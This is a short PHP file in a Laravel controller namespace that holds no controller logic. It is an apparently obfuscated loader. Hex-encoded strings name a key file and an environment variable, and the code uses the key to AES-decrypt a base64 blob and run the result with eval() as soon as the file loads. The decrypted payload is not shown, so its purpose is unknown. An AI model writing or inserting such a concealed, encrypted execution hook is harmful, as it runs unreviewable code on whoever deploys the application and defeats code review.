<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('DpWAmhjqX8w8Y1IH8nirUA==');

$c=base64_decode(

'MU4mQ8YbTFpNgroPGyQi7LoCoDsWQqd2BA8svl8+61kU1r2dX9GsOsXCpYyCkLnbV59PZkXg1E4A' .
'Qzlc6LYW5bUpAq71Jsn0VInYBL3zyKuwYeNCZRVvSXulbrek0FHq0GOf0fqxxuGry/jzll/VYQjT' .
'nq1bnRAqqjFApT83944eg8otAQ/oCuT6odzGHhOhY1EqSWcTxgBPaF9gbNLq/HkvsRwJKllBDrFf' .
'2+qpq/pqI3+/2mvxoiKAQ4e0daIR'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

